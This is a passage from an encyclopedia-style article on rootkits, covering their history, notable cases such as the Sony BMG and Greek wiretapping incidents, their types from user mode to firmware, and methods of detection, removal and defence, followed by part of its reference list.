 analysis. Removal can be complicated or practically impossible, especially in cases where the rootkit resides in the 
kernel
; reinstallation of the operating system may be the only available solution to the problem. When dealing with 
firmware
 rootkits, removal may require 
hardware
 replacement, or specialized equipment.





History
[
edit
]


The term 
rootkit
, 
rkit
, or 
root kit
 originally referred to a maliciously modified set of administrative tools for a 
Unix-like
 
operating system
 that granted "
root
" access.
[
4
]
 If an intruder could replace the standard administrative tools on a system with a rootkit, the intruder could obtain root access over the system whilst simultaneously concealing these activities from the legitimate 
system administrator
. These first-generation rootkits were trivial to detect by using tools such as 
Tripwire
 that had not been compromised to access the same information.
[
5
]
[
6
]
 Lane Davis and Steven Dake wrote the earliest known rootkit in 1990 for 
Sun Microsystems
' 
SunOS
 UNIX operating system.
[
7
]
 In the lecture he gave upon receiving the 
Turing award
 in 1983, 
Ken Thompson
 of 
Bell Labs
, one of the creators of 
Unix
, theorized about subverting the 
C compiler
 in a Unix distribution and discussed the exploit. The modified compiler would detect attempts to compile the Unix 
login
 command and generate altered code that would accept not only the user's correct password, but an additional "
backdoor
" password known to the attacker. Additionally, the compiler would detect attempts to compile a new version of the compiler, and would insert the same exploits into the new compiler. A review of the source code for the 
login
 command or the updated compiler would not reveal any malicious code.
[
8
]
 This exploit was equivalent to a rootkit.

The first documented 
computer virus
 to target the 
personal computer
, discovered in 1986, used 
cloaking
 techniques to hide itself: the 
Brain virus
 intercepted attempts to read the 
boot sector
, and redirected these to elsewhere on the disk, where a copy of the original boot sector was kept.
[
1
]

Over time, 
DOS
-virus cloaking methods became more sophisticated. Advanced techniques included 
hooking
 low-level disk 
INT 13H
 BIOS 
interrupt
 calls to hide unauthorized modifications to files.
[
1
]


The first malicious rootkit for the 
Windows NT
 operating system appeared in 1999: a trojan called 
NTRootkit
 created by 
Greg Hoglund
.
[
9
]
 It was followed by 
HackerDefender
 in 2003.
[
1
]
 The first rootkit targeting 
Mac OS X
 appeared in 2009,
[
10
]
 while the 
Stuxnet
 worm was the first to target 
programmable logic controllers
 (PLC).
[
11
]




Sony BMG copy protection rootkit scandal
[
edit
]


Screenshot of 
RootkitRevealer
, showing the files hidden by the 
Extended Copy Protection
 rootkit


Main article: 
Sony BMG copy protection rootkit scandal


In 2005, 
Sony BMG
 published 
CDs
 with 
copy protection
 and 
digital rights management
 software called 
Extended Copy Protection
, created by software company First 4 Internet. The software included a music player but silently installed a rootkit which limited the user's ability to access the CD.
[
12
]
 Software engineer 
Mark Russinovich
, who created the rootkit detection tool 
RootkitRevealer
, discovered the rootkit on one of his computers.
[
1
]
 The ensuing scandal raised the public's awareness of rootkits.
[
13
]
 To cloak itself, the rootkit hid any file starting with "$sys$" from the user. Soon after Russinovich's report, malware appeared which took advantage of the existing rootkit on affected systems.
[
1
]
 One 
BBC
 analyst called it a "
public relations
 nightmare."
[
14
]
 Sony BMG released 
patches
 to 
uninstall
 the rootkit, but it exposed users to an even more serious vulnerability.
[
15
]
 The company eventually recalled the CDs. In the United States, a 
class-action lawsuit
 was brought against Sony BMG.
[
16
]




Greek wiretapping case 2004–05
[
edit
]


Main article: 
Greek wiretapping case 2004–05


The 
Greek wiretapping case 2004–05
, also referred to as Greek Watergate,
[
17
]
 involved the illegal 
telephone tapping
 of more than 100 
mobile phones
 on the 
Vodafone Greece
 network belonging mostly to members of the 
Greek
 government and top-ranking civil servants. The taps began sometime near the beginning of August 2004 and were removed in March 2005 without discovering the identity of the perpetrators. The intruders installed a rootkit targeting Ericsson's 
AXE telephone exchange
. According to 
IEEE Spectrum
, this was "the first time a rootkit has been observed on a special-purpose system, in this case an Ericsson telephone switch."
[
18
]
 The rootkit was designed to patch the memory of the exchange while it was running, enable 
wiretapping
 while disabling audit logs, patch the commands that list active processes and active data blocks, and modify the data block 
checksum
 verification command. A "backdoor" allowed an operator with 
sysadmin
 status to deactivate the exchange's transaction log, alarms and access commands related to the surveillance capability.
[
18
]
 The rootkit was discovered after the intruders installed a faulty update, which caused 
SMS
 texts to be undelivered, leading to an automated failure report being generated. Ericsson engineers were called in to investigate the fault and discovered the hidden data blocks containing the list of phone numbers being monitored, along with the rootkit and illicit monitoring software.



Uses
[
edit
]


Modern rootkits do not elevate access,
[
4
]
 but rather are used to make another software payload undetectable by adding stealth capabilities.
[
9
]
 Most rootkits are classified as 
malware
, because the payloads they are bundled with are malicious. For example, a payload might covertly steal user 
passwords
, 
credit card
 information, computing resources, or conduct other unauthorized activities. A small number of rootkits may be considered utility applications by their users: for example, a rootkit might cloak a 
CD-ROM
-emulation driver, allowing 
video game
 users to defeat 
anti-piracy
 measures that require insertion of the original installation media into a physical optical drive to verify that the software was legitimately purchased.

Rootkits and their payloads have many uses:



Provide an attacker with full access via a 
backdoor
, permitting unauthorized access to, for example, steal or falsify documents. One of the ways to carry this out is to subvert the login mechanism, such as the /bin/login program on 
Unix-like
 systems or 
GINA
 on Windows. The replacement appears to function normally, but also accepts a secret login combination that allows an attacker direct access to the system with administrative privileges, bypassing standard 
authentication
 and 
authorization
 mechanisms.


Conceal other 
malware
, notably password-stealing 
key loggers
 and 
computer viruses
.
[
19
]


Appropriate the compromised machine as a 
zombie computer
 for attacks on other computers. (The attack originates from the compromised system or network, instead of the attacker's system.) "Zombie" computers are typically members of large 
botnets
 that can–amongst other things–launch 
denial-of-service attacks
, distribute 
email
 
spam
, and conduct 
click fraud
.
[
20
]


In some instances, rootkits provide desired functionality, and may be installed intentionally on behalf of the computer user:



Detect attacks, for example, in a 
honeypot
.
[
21
]


Enhance emulation software and security software.
[
22
]
 
Alcohol 120%
 and 
Daemon Tools
 are commercial examples of non-hostile rootkits used to defeat copy-protection mechanisms such as 
SafeDisc
 and 
SecuROM
.
[
23
]
 
Kaspersky antivirus software
 also uses techniques resembling rootkits to protect itself from malicious actions. It loads its own 
drivers
 to intercept system activity, and then prevents other processes from doing harm to itself. Its processes are not hidden, but cannot be terminated by standard methods.


Anti-theft protection: Laptops may have BIOS-based rootkit software that will periodically report to a central authority, allowing the laptop to be monitored, disabled or wiped of information in the event that it is stolen.
[
24
]


Bypassing 
Microsoft Product Activation
[
25
]


Types
[
edit
]


Further information: 
Protection ring


There are at least five types of rootkit, ranging from those at the lowest level in firmware (with the highest privileges), through to the least privileged user-based variants that operate in 
Ring 3
. Hybrid combinations of these may occur spanning, for example, user mode and kernel mode.
[
26
]




User mode
[
edit
]


Computer security 
rings
 (Note that 
Ring -1
 is not shown)


User-mode rootkits run in 
Ring 3
, along with other applications as user, rather than low-level system processes.
[
27
]
 They have a number of possible installation vectors to intercept and modify the standard behavior of application programming interfaces (APIs). Some inject a 
dynamically linked
 library (such as a 
.DLL
 file on Windows, or a .dylib file on 
Mac OS X
) into other processes, and are thereby able to execute inside any target process to spoof it; others with sufficient privileges simply overwrite the memory of a target application. Injection mechanisms include:
[
27
]




Use of vendor-supplied application extensions. For example, 
Windows Explorer
 has public interfaces that allow third parties to extend its functionality.


Interception of 
messages
.


Debuggers
.


Exploitation of 
security vulnerabilities
.


Function 
hooking
 or patching of commonly used APIs, for example, to hide a running process or file that resides on a filesystem.
[
28
]


...since user mode applications all run in their own memory space, the rootkit needs to perform this patching in the memory space of every running application. In addition, the rootkit needs to monitor the system for any new applications that execute and patch those programs' memory space before they fully execute.
— 
Windows Rootkit Overview, Symantec
[
4
]


Kernel mode
[
edit
]


Kernel-mode rootkits run with the highest operating system privileges (
Ring 0
) by adding code or replacing portions of the core operating system, including both the 
kernel
 and associated 
device drivers
.
[
citation needed
]
 Most operating systems support kernel-mode device drivers, which execute with the same privileges as the operating system itself. As such, many kernel-mode rootkits are developed as device drivers or loadable modules, such as 
loadable kernel modules
 in 
Linux
 or 
device drivers
 in 
Microsoft Windows
. This class of rootkit has unrestricted security access, but is more difficult to write.
[
29
]
 The complexity makes bugs common, and any bugs in code operating at the kernel level may seriously impact system stability, leading to discovery of the rootkit.
[
29
]
 One of the first widely known kernel rootkits was developed for 
Windows NT 4.0
 and released in 
Phrack
 magazine in 1999 by 
Greg Hoglund
.
[
30
]
[
31
]
 Kernel rootkits can be especially difficult to detect and remove because they operate at the same 
security level
 as the operating system itself, and are thus able to intercept or subvert the most trusted operating system operations. Any software, such as 
antivirus software
, running on the compromised system is equally vulnerable.
[
32
]
 In this situation, no part of the system can be trusted.

A rootkit can modify data structures in the Windows kernel using a method known as 
direct kernel object manipulation
 (DKOM).
[
33
]
 This method can be used to hide processes. A kernel mode rootkit can also hook the 
System Service Descriptor Table
 (SSDT), or modify the gates between user mode and kernel mode, in order to cloak itself.
[
4
]
 Similarly for the 
Linux
 operating system, a rootkit can modify the 
system call table
 to subvert kernel functionality.
[
34
]
[
35
]
 It is common that a rootkit creates a hidden, encrypted filesystem in which it can hide other malware or original copies of files it has infected.
[
36
]
 Operating systems are evolving to counter the threat of kernel-mode rootkits. For example, 64-bit editions of Microsoft Windows now implement mandatory signing of all kernel-level drivers in order to make it more difficult for untrusted code to execute with the highest privileges in a system.
[
37
]




Bootkits
[
edit
]


A kernel-mode rootkit variant called a 
bootkit
 can infect startup code like the 
Master Boot Record
 (MBR), 
Volume Boot Record
 (VBR), or 
boot sector
, and in this way can be used to attack 
full disk encryption
 systems.
[
38
]

An example of such an attack on disk encryption is the "
evil maid attack
", in which an attacker installs a bootkit on an unattended computer. The envisioned scenario is a maid sneaking into the hotel room where the victims left their hardware.
[
39
]
 The bootkit replaces the legitimate 
boot loader
 with one under their control. Typically the malware loader persists through the transition to 
protected mode
 when the kernel has loaded, and is thus able to subvert the kernel.
[
40
]
[
41
]
[
42
]
 For example, the "Stoned Bootkit" subverts the system by using a compromised 
boot loader
 to intercept encryption keys and passwords.
[
43
]
[
self-published source?
]
 In 2010, the Alureon rootkit has successfully subverted the requirement for 64-bit kernel-mode driver signing in 
Windows 7
, by modifying the 
master boot record
.
[
44
]
 Although not malware in the sense of doing something the user doesn't want, certain "Vista Loader" or "Windows Loader" software work in a similar way by injecting an 
ACPI
 SLIC (System Licensed Internal Code) table in the RAM-cached version of the BIOS during boot, in order to defeat the 
Windows Vista and Windows 7 activation process
.
[
citation needed
]
 This vector of attack was rendered useless in the (non-server) versions of 
Windows 8
, which use a unique, machine-specific key for each system, that can only be used by that one machine.
[
45
]
 Many antivirus companies provide free utilities and programs to remove bootkits.



Hypervisor level
[
edit
]


Rootkits have been created as Type II 
Hypervisors
 in academia as proofs of concept. By exploiting hardware virtualization features such as 
Intel VT
 or 
AMD-V
, this type of rootkit runs in Ring -1 and hosts the target operating system as a 
virtual machine
, thereby enabling the rootkit to intercept hardware calls made by the original operating system.
[
6
]
 Unlike normal hypervisors, they do not have to load before the operating system, but can load into an operating system before promoting it into a virtual machine.
[
6
]
 A hypervisor rootkit does not have to make any modifications to the kernel of the target to subvert it; however, that does not mean that it cannot be detected by the guest operating system. For example, timing differences may be detectable in 
CPU
 instructions.
[
6
]
 The "SubVirt" laboratory rootkit, developed jointly by 
Microsoft
 and 
University of Michigan
 researchers, is an academic example of a virtual-machine–based rootkit (VMBR),
[
46
]

while 
Blue Pill
 software is another. In 2009, researchers from Microsoft and 
North Carolina State University
 demonstrated a hypervisor-layer anti-rootkit called 
Hooksafe
, which provides generic protection against kernel-mode rootkits.
[
47
]
 
Windows 10
 introduced a new feature called "Device Guard", that takes advantage of virtualization to provide independent external protection of an operating system against rootkit-type malware.
[
48
]




Firmware and hardware
[
edit
]


A 
firmware
 rootkit uses device or platform firmware to create a persistent malware image in hardware, such as a 
router
, 
network card
,
[
49
]
 
hard drive
, or the system 
BIOS
.
[
27
]
[
50
]
 The rootkit hides in firmware, because firmware is not usually inspected for 
code integrity
. John Heasman demonstrated the viability of firmware rootkits in both 
ACPI
 firmware routines
[
51
]
 and in a 
PCI
 expansion card 
ROM
.
[
52
]
 In October 2008, criminals tampered with European 
credit-card
-reading machines before they were installed. The devices intercepted and transmitted credit card details via a mobile phone network.
[
53
]
 In March 2009, researchers Alfredo Ortega and 
Anibal Sacco
 published details of a 
BIOS
-level Windows rootkit that was able to survive disk replacement and operating system re-installation.
[
54
]
[
55
]
[
56
]
 A few months later they learned that some laptops are sold with a legitimate rootkit, known as Absolute 
CompuTrace
 or Absolute 
LoJack for Laptops
, preinstalled in many BIOS images. This is an anti-
theft
 technology system that researchers showed can be turned to malicious purposes.
[
24
]


Intel Active Management Technology
, part of 
Intel vPro
, implements 
out-of-band management
, giving administrators 
remote administration
, 
remote management
, and 
remote control
 of PCs with no involvement of the host processor or BIOS, even when the system is powered off. Remote administration includes remote power-up and power-down, remote reset, redirected boot, console redirection, pre-boot access to BIOS settings, programmable filtering for inbound and outbound network traffic, agent presence checking, out-of-band policy-based alerting, access to system information, such as hardware asset information, persistent event logs, and other information that is stored in dedicated memory (not on the hard drive) where it is accessible even if the OS is down or the PC is powered off. Some of these functions require the deepest level of rootkit, a second non-removable spy computer built around the main computer. Sandy Bridge and future chipsets have "the ability to remotely kill and restore a lost or stolen PC via 3G". Hardware rootkits built into the 
chipset
 can help recover stolen computers, remove data, or render them useless, but they also present privacy and security concerns of undetectable spying and redirection by management or hackers who might gain control.



Installation and cloaking
[
edit
]


Rootkits employ a variety of techniques to gain control of a system; the type of rootkit influences the choice of attack vector. The most common technique leverages 
security vulnerabilities
 to achieve surreptitious 
privilege escalation
. Another approach is to use a 
Trojan horse
, deceiving a computer user into trusting the rootkit's installation program as benign—in this case, 
social engineering
 convinces a user that the rootkit is beneficial.
[
29
]
 The installation task is made easier if the 
principle of least privilege
 is not applied, since the rootkit then does not have to explicitly request elevated (administrator-level) privileges. Other classes of rootkits can be installed only by someone with physical access to the target system. Some rootkits may also be installed intentionally by the owner of the system or somebody authorized by the owner, e.g. for the purpose of 
employee monitoring
, rendering such subversive techniques unnecessary.
[
57
]
 Some malicious rootkit installations are commercially driven, with a pay-per-install (PPI) compensation method typical for distribution.
[
58
]
[
59
]


Once installed, a rootkit takes active measures to obscure its presence within the host system through subversion or evasion of standard operating system 
security
 tools and 
application programming interface
 (APIs) used for diagnosis, scanning, and monitoring.
[
60
]
 Rootkits achieve this by modifying the behavior of 
core parts of an operating system
 through loading code into other processes, the installation or modification of 
drivers
, or 
kernel modules
. Obfuscation techniques include concealing running processes from system-monitoring mechanisms and hiding system files and other configuration data.
[
61
]
 It is not uncommon for a rootkit to disable the 
event logging
 capacity of an operating system, in an attempt to hide evidence of an attack. Rootkits can, in theory, subvert 
any
 operating system activities.
[
62
]
 The "perfect rootkit" can be thought of as similar to a "
perfect crime
": one that nobody realizes has taken place. Rootkits also take a number of measures to ensure their survival against detection and "cleaning" by antivirus software in addition to commonly installing into Ring 0 (kernel-mode), where they have complete access to a system. These include 
polymorphism
 (changing so their "signature" is hard to detect), stealth techniques, regeneration, disabling or turning off anti-malware software,
[
63
]
 and not installing on 
virtual machines
 where it may be easier for researchers to discover and analyze them.



Detection
[
edit
]


The fundamental problem with rootkit detection is that if the operating system has been subverted, particularly by a kernel-level rootkit, it cannot be trusted to find unauthorized modifications to itself or its components.
[
62
]
 Actions such as requesting a list of running processes, or a list of files in a directory, cannot be trusted to behave as expected. In other words, rootkit detectors that work while running on infected systems are only effective against rootkits that have some defect in their camouflage, or that run with lower user-mode privileges than the detection software in the kernel.
[
29
]
 As with 
computer viruses
, the detection and elimination of rootkits is an ongoing struggle between both sides of this conflict.
[
62
]
 Detection can take a number of different approaches, including looking for virus "signatures" (e.g. antivirus software), integrity checking (e.g. 
digital signatures
), difference-based detection (comparison of expected vs. actual results), and behavioral detection (e.g. monitoring CPU usage or network traffic).

For kernel-mode rootkits, detection is considerably more complex, requiring careful scrutiny of the System Call Table to look for 
hooked functions
 where the malware may be subverting system behavior,
[
64
]
 as well as 
forensic
 scanning of memory for patterns that indicate hidden processes. Unix rootkit detection offerings include Zeppoo,
[
65
]
 
chkrootkit
, 
rkhunter
 and 
OSSEC
. For Windows, detection tools include Microsoft Sysinternals 
RootkitRevealer
,
[
66
]
 
Avast Antivirus
,
[
67
]
 
Sophos
 Anti-Rootkit,
[
68
]
 
F-Secure
,
[
69
]
 Radix,
[
70
]
 
GMER
,
[
71
]
 and 
WindowsSCOPE
. Any rootkit detectors that prove effective ultimately contribute to their own ineffectiveness, as malware authors adapt and test their code to escape detection by well-used tools.
[
Notes 1
]
 Detection by examining storage while the suspect operating system is not operational can miss rootkits not recognised by the checking software, as the rootkit is not active and suspicious behavior is suppressed; conventional anti-malware software running with the rootkit operational may fail if the rootkit hides itself effectively.



Alternative trusted medium
[
edit
]


The best and most reliable method for operating-system-level rootkit detection is to shut down the computer suspected of infection, and then to check its 
storage
 by 
booting
 from an alternative trusted medium (e.g. a "rescue" 
CD-ROM
 or 
USB flash drive
).
[
72
]
 The technique is effective because a rootkit cannot actively hide its presence if it is not running.



Behavioral-based
[
edit
]


The behavioral-based approach to detecting rootkits attempts to infer the presence of a rootkit by looking for rootkit-like behavior. For example, by 
profiling
 a system, differences in the timing and frequency of API calls or in overall CPU utilization can be attributed to a rootkit. The method is complex and is hampered by a high incidence of 
false positives
. Defective rootkits can sometimes introduce very obvious changes to a system: the 
Alureon
 rootkit crashed Windows systems after a security update exposed a design flaw in its code.
[
73
]
[
74
]
 Logs from a 
packet analyzer
, 
firewall
, or 
intrusion prevention system
 may present evidence of rootkit behaviour in a networked environment.
[
26
]




Signature-based
[
edit
]


Antivirus products rarely catch all viruses in public tests (depending on what is used and to what extent), even though security software vendors incorporate rootkit detection into their products. Should a rootkit attempt to hide during an antivirus scan, a stealth detector may notice; if the rootkit attempts to temporarily unload itself from the system, signature detection (or "fingerprinting") can still find it.
[
75
]
 This combined approach forces attackers to implement counterattack mechanisms, or "retro" routines, that attempt to terminate antivirus programs. Signature-based detection methods can be effective against well-published rootkits, but less so against specially crafted, custom-root rootkits.
[
62
]




Difference-based
[
edit
]


Another method that can detect rootkits compares "trusted" raw data with "tainted" content returned by an 
API
. For example, 
binaries
 present on disk can be compared with their copies within 
operating memory
 (in some operating systems, the in-memory image should be identical to the on-disk image), or the results returned from 
file system
 or 
Windows Registry
 APIs can be checked against raw structures on the underlying physical disks
[
62
]
[
76
]
—however, in the case of the former, some valid differences can be introduced by operating system mechanisms like memory relocation or 
shimming
. A rootkit may detect the presence of such a difference-based scanner or 
virtual machine
 (the latter being commonly used to perform forensic analysis), and adjust its behaviour so that no differences can be detected. Difference-based detection was used by 
Russinovich
's 
RootkitRevealer
 tool to find the Sony DRM rootkit.
[
1
]




Integrity checking
[
edit
]


The 
rkhunter
 utility uses 
SHA-1
 hashes to verify the integrity of system files.


Code signing
 uses 
public-key infrastructure
 to check if a file has been modified since being 
digitally signed
 by its publisher. Alternatively, a system owner or administrator can use a 
cryptographic hash function
 to compute a "fingerprint" at installation time that can help to detect subsequent unauthorized changes to on-disk code libraries.
[
77
]
 However, unsophisticated schemes check only whether the code has been modified since installation time; subversion prior to that time is not detectable. The fingerprint must be re-established each time changes are made to the system: for example, after installing security updates or a 
service pack
. The hash function creates a 
message digest
, a relatively short code calculated from each bit in the file using an algorithm that creates large changes in the message digest with even smaller changes to the original file. By recalculating and comparing the message digest of the installed files at regular intervals against a trusted list of message digests, changes in the system can be detected and monitored—as long as the original baseline was created before the malware was added.

More-sophisticated rootkits are able to subvert the verification process by presenting an unmodified copy of the file for inspection, or by making code modifications only in memory, reconfiguration registers, which are later compared to a white list of expected values.
[
78
]
 The code that performs hash, compare, or extend operations must also be protected—in this context, the notion of an 
immutable root-of-trust
 holds that the very first code to measure security properties of a system must itself be trusted to ensure that a rootkit or bootkit does not compromise the system at its most fundamental level.
[
79
]




Memory dumps
[
edit
]


Forcing a complete dump of 
virtual memory
 will capture an active rootkit (or a 
kernel dump
 in the case of a kernel-mode rootkit), allowing offline 
forensic analysis
 to be performed with a 
debugger
 against the resulting 
dump file
, without the rootkit being able to take any measures to cloak itself. This technique is highly specialized, and may require access to non-public 
source code
 or 
debugging symbols
. Memory dumps initiated by the operating system cannot always be used to detect a hypervisor-based rootkit, which is able to intercept and subvert the lowest-level attempts to read memory
[
6
]
—a hardware device, such as one that implements a 
non-maskable interrupt
, may be required to dump memory in this scenario.
[
80
]
[
81
]
 
Virtual machines
 also make it easier to analyze the memory of a compromised machine from the underlying hypervisor, so some rootkits will avoid infecting virtual machines for this reason.



Removal
[
edit
]


Manual removal of a rootkit is often extremely difficult for a typical computer user,
[
27
]
 but a number of security-software vendors offer tools to automatically detect and remove some rootkits, typically as part of an 
antivirus suite
. As of 2005
[update]
, Microsoft's monthly 
Windows Malicious Software Removal Tool
 is able to detect and remove some classes of rootkits.
[
82
]
[
83
]
   Also, Windows Defender Offline can remove rootkits, as it runs from a trusted environment before the operating system starts.
[
84
]
 Some antivirus scanners can bypass 
file system
 APIs, which are vulnerable to manipulation by a rootkit. Instead, they access raw file system structures directly, and use this information to validate the results from the system APIs to identify any differences that may be caused by a rootkit.
[
Notes 2
]
[
85
]
[
86
]
[
87
]
[
88
]
 There are experts who believe that the only reliable way to remove them is to re-install the operating system from trusted media.
[
89
]
[
90
]
 This is because antivirus and malware removal tools running on an untrusted system may be ineffective against well-written kernel-mode rootkits. Booting an alternative operating system from trusted media can allow an infected system volume to be mounted and potentially safely cleaned and critical data to be copied off—or, alternatively, a forensic examination performed.
[
26
]
 Lightweight operating systems such as 
Windows PE
, 
Windows Recovery Console
, 
Windows Recovery Environment
, 
BartPE
, or 
Live Distros
 can be used for this purpose, allowing the system to be "cleaned". Even if the type and nature of a rootkit is known, manual repair may be impractical, while re-installing the operating system and applications is safer, simpler and quicker.
[
89
]




Defenses
[
edit
]


System 
hardening
 represents one of the first layers of defence against a rootkit, to prevent it from being able to install.
[
91
]
 Applying 
security patches
, implementing the 
principle of least privilege
, reducing the 
attack surface
 and installing antivirus software are some standard security best practices that are effective against all classes of malware.
[
92
]
 New secure boot specifications like 
UEFI
 have been designed to address the threat of bootkits, but even these are vulnerable if the security features they offer are not utilized.
[
50
]
 For server systems, remote server attestation using technologies such as Intel 
Trusted Execution Technology
 (TXT) provide a way of verifying that servers remain in a known good state. For example, 
Microsoft
 
Bitlocker
's encryption of data-at-rest verifies that servers are in a known "good state" on bootup. 
PrivateCore
 vCage is a software offering that secures data-in-use (memory) to avoid bootkits and rootkits by verifying servers are in a known "good" state on bootup. The PrivateCore implementation works in concert with Intel TXT and locks down server system interfaces to avoid potential bootkits and rootkits.

Another defense mechanism called the Virtual Wall (VTW) approach, serves as a lightweight hypervisor with rootkit detection and event tracing capabilities. In normal operation (guest mode), Linux runs, and when a loaded LKM violates security policies, the system switches to host mode. The VTW in host mode detects, traces, and classifies rootkit events based on memory access control and event injection mechanisms. Experimental results demonstrate the VTW's effectiveness in timely detection and defense against kernel rootkits with minimal CPU overhead (less than 2%). The VTW is compared favorably to other defense schemes, emphasizing its simplicity in implementation and potential performance gains on Linux servers.
[
93
]




See also
[
edit
]


Computer security conference


Host-based intrusion detection system


Man-in-the-middle attack


The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System


Notes
[
edit
]






^
 
The process name of Sysinternals RootkitRevealer was targeted by malware; in an attempt to counter this countermeasure, the tool now uses a randomly generated process name.




^
 
In theory, a sufficiently sophisticated kernel-level rootkit could subvert read operations against raw file system data structures as well, so that they match the results returned by APIs.






References
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
f
 
g
 
h
 
"Rootkits, Part 1 of 3: The Growing Threat"
 
(PDF)
. 
McAfee
. 2006-04-17. Archived from 
the original
 
(PDF)
 on 2006-08-23.




^
 
Evancich, N.; Li, J. (2016-08-23). 
"6.2.3 Rootkits"
. In Colbert, Edward J. M.; Kott, Alexander (eds.). 
Cyber-security of SCADA and Other Industrial Control Systems
. Springer. p. 100. 
ISBN
 
9783319321257
 – via 
Google Books
.




^
 
"What is Rootkit – Definition and Explanation"
. 
www.kaspersky.com
. 2021-04-09
. Retrieved 
2021-11-13
.




^ 
a
 
b
 
c
 
d
 
"Windows Rootkit Overview"
 
(PDF)
. 
Symantec
. 2006-03-26. Archived from 
the original
 
(PDF)
 on 2010-12-14
. Retrieved 
2010-08-17
.




^
 
Sparks, Sherri; Butler, Jamie (2005-08-01). "Raising The Bar For Windows Rootkit Detection". 
Phrack
. 
0xb
 (x3d).




^ 
a
 
b
 
c
 
d
 
e
 
Myers, Michael; Youndt, Stephen (2007-08-07). An Introduction to Hardware-Assisted Virtual Machine (HVM) Rootkits (Report). Crucial Security. 
CiteSeerX
 
10.1.1.90.8832
.




^
 
Andrew Hay; Daniel Cid; Rory Bray (2008). 
OSSEC Host-Based Intrusion Detection Guide
. Syngress. p. 276. 
ISBN
 
978-1-59749-240-9
 – via 
Google Books
.




^
 
Thompson, Ken (August 1984). 
"Reflections on Trusting Trust"
 
(PDF)
. 
Communications of the ACM
. 
27
 (8): 761. 
doi
:
10.1145/358198.358210
.




^ 
a
 
b
 
Greg Hoglund; James Butler (2006). 
Rootkits: Subverting the Windows kernel
. Addison-Wesley. p. 4. 
ISBN
 
978-0-321-29431-9
 – via 
Google Books
.




^
 
Dai Zovi, Dino (2009-07-26). 
Advanced Mac OS X Rootkits
 
(PDF)
. 
Blackhat
. Endgame Systems
. Retrieved 
2010-11-23
.




^
 
"Stuxnet Introduces the First Known Rootkit for Industrial Control Systems"
. 
Symantec
. 2010-08-06. Archived from 
the original
 on August 20, 2010
. Retrieved 
2010-12-04
.




^
 
"Spyware Detail: XCP.Sony.Rootkit"
. 
Computer Associates
. 2005-11-05. Archived from 
the original
 on 2010-08-18
. Retrieved 
2010-08-19
.




^
 
Russinovich, Mark
 (2005-10-31). 
"Sony, Rootkits and Digital Rights Management Gone Too Far"
. 
TechNet Blogs
. 
Microsoft
. Retrieved 
2010-08-16
.




^
 
"Sony's long-term rootkit CD woes"
. 
BBC News
. 2005-11-21
. Retrieved 
2008-09-15
.




^
 
Felton, Ed (2005-11-15). 
"Sony's Web-Based Uninstaller Opens a Big Security Hole; Sony to Recall Discs"
.




^
 
Knight, Will (2005-11-11). 
"Sony BMG sued over cloaking software on music CD"
. 
New Scientist
. Retrieved 
2010-11-21
.




^
 
Kyriakidou, Dina (March 2, 2006). 
"
"Greek Watergate" Scandal Sends Political Shockwaves"
. 
Reuters
. Retrieved 
2007-11-24
.
 
[
dead link
]




^ 
a
 
b
 
Vassilis Prevelakis; Diomidis Spinellis (July 2007). 
"The Athens Affair"
. Archived from 
the original
 on August 1, 2009.




^
 
Russinovich, Mark
 (June 2005). 
"Unearthing Root Kits"
. 
Windows IT Pro
. Archived from 
the original
 on 2012-09-18
. Retrieved 
2010-12-16
.




^
 
Marks, Joseph (July 1, 2021). 
"The Cybersecurity 202: DOJ's future is in disrupting hackers, not just indicting them"
. 
The Washington Post
. Retrieved 
July 24,
 2021
.




^
 
Steve Hanna (September 2007). 
"Using Rootkit Technology for Honeypot-Based Malware Detection"
 
(PDF)
. CCEID Meeting.




^
 
Russinovich, Mark
 (6 February 2006). 
"Using Rootkits to Defeat Digital Rights Management"
. 
Winternals
. SysInternals. Archived from 
the original
 on 14 August 2006
. Retrieved 
2006-08-13
.




^
 
"Symantec Releases Update for its Own Rootkit"
. 
HWM
 (March): 89. 2006 – via 
Google Books
.




^ 
a
 
b
 
Ortega, Alfredo; Sacco, Anibal (2009-07-24). 
Deactivate the Rootkit: Attacks on BIOS anti-theft technologies
 
(PDF)
. 
Black Hat USA 2009
 (PDF). Boston, MA: Core Security Technologies
. Retrieved 
2014-06-12
.




^
 
Kleissner, Peter (2009-09-02). 
"Stoned Bootkit: The Rise of MBR Rootkits & Bootkits in the Wild"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2011-07-16
. Retrieved 
2010-11-23
.




^ 
a
 
b
 
c
 
Anson, Steve; Bunting, Steve (2007). 
Mastering Windows Network Forensics and Investigation
. John Wiley and Sons. pp. 73–74. 
ISBN
 
978-0-470-09762-5
.




^ 
a
 
b
 
c
 
d
 
"Rootkits Part 2: A Technical Primer"
 
(PDF)
. 
McAfee
. 2007-04-03. Archived from 
the original
 
(PDF)
 on 2008-12-05
. Retrieved 
2010-08-17
.




^
 
Kdm. 
"NTIllusion: A portable Win32 userland rootkit"
. 
Phrack
. 
62
 (12).




^ 
a
 
b
 
c
 
d
 
"Understanding Anti-Malware Technologies"
 
(PDF)
. 
Microsoft
. 2007-02-21. Archived from 
the original
 
(PDF)
 on 2010-09-11
. Retrieved 
2010-08-17
.




^
 
Hoglund, Greg (1999-09-09). 
"A *REAL* NT Rootkit, Patching the NT Kernel"
. 
Phrack
. 
9
 (55)
. Retrieved 
2010-11-21
.




^
 
Chuvakin, Anton
 (2003-02-02). 
An Overview of Unix Rootkits
 
(PDF)
 (Report). Chantilly, Virginia: iDEFENSE. Archived from 
the original
 
(PDF)
 on 2011-07-25
. Retrieved 
2010-11-21
.




^
 
Butler, James; Sparks, Sherri (2005-11-16). 
"Windows Rootkits of 2005, Part Two"
. 
Symantec Connect
. Symantec
. Retrieved 
2010-11-13
.




^
 
Butler, James; Sparks, Sherri (2005-11-03). 
"Windows Rootkits of 2005, Part One"
. 
Symantec Connect
. Symantec
. Retrieved 
2010-11-12
.




^
 
Burdach, Mariusz (2004-11-17). 
"Detecting Rootkits And Kernel-level Compromises In Linux"
. 
Symantec
. Retrieved 
2010-11-23
.




^
 
Osborne, Charlie (September 17, 2019). 
"Skidmap malware buries into the kernel to hide illicit cryptocurrency mining"
. 
ZDNet
. Retrieved 
July 24,
 2021
.




^
 
Marco Giuliani (11 April 2011). 
"ZeroAccess – An Advanced Kernel Mode Rootkit"
 
(PDF)
. 
Webroot Software
. Retrieved 
10 August
 2011
.




^
 
"Driver Signing Requirements for Windows"
. 
Microsoft
. Retrieved 
2008-07-06
.




^
 
Salter, Jim (July 31, 2020). 
"Red Hat and CentOS systems aren't booting due to BootHole patches"
. 
Ars Technica
